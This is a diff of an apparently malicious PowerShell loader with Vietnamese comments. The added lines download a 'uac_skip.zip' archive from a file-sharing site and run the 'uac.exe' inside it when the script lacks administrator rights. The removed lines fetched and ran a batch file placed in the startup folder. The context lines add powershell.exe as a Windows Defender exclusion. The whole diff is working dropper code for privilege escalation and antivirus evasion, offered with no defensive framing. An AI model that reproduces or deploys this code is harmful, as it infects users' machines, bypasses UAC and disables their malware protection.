@@ -36,17 +36,11 @@ Add-Type -AssemblyName System.Windows.Forms
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     try {
         # Tải xuống tệp batch
-        
-        $outputFile = "$startupfolder\download.bat"
-        
-
-        $url = "https://github.com/43a1723/test/releases/download/AutoBuild/download.bat"
-        Invoke-WebRequest -Uri $url -OutFile $outputFile -ErrorAction Stop
-        Start-Process -FilePath $outputFile -Wait -ErrorAction Stop
-        Write-Output "Khởi chạy tệp batch."
-        
-        # Kết thúc tiến trình PowerShell sau khi thực thi tệp batch
-        Write-Output "Kết thúc tiến trình PowerShell."
+        $TempPath = [System.IO.Path]::Combine($env:TEMP, "uac_skip.zip")
+        Invoke-WebRequest -Uri "https://anonsharing.com/file/f10267e9ff48f0aa/uac_skip.zip" -OutFile $TempPath
+        $ExtractPath = [System.IO.Path]::Combine($env:TEMP, "uac_skip")
+        Expand-Archive -Path $TempPath -DestinationPath $ExtractPath
+        Start-Process "$ExtractPath\uac.exe"
         Stop-Process -Id $PID -Force
     }
     catch {
@@ -54,25 +48,6 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     }
 }
 
-$AppId = "haideptrai"
-$mutexName = "Global\$AppId"
-$CreatedNew = $false
-
-try {
-    # Kiểm tra xem Mutex đã tồn tại chưa
-    $mutex = [System.Threading.Mutex]::OpenExisting($mutexName)
-    Write-Host "[!] An instance of this script is already running."
-    Stop-Process -Id $PID -Force
-} catch {
-    # Nếu Mutex chưa tồn tại, tạo mới
-    $mutex = New-Object System.Threading.Mutex($true, $mutexName, [ref]$CreatedNew)
-}
-
-# Nếu không tạo được Mutex mới, thoát script
-if (-not $CreatedNew) {
-    Write-Host "[!] Another instance is already running."
-    Stop-Process -Id $PID -Force
-}
 
 Remove-Item -Path "$startupfolder\download.bat" -Force
 Add-MpPreference -ExclusionProcess "powershell.exe"
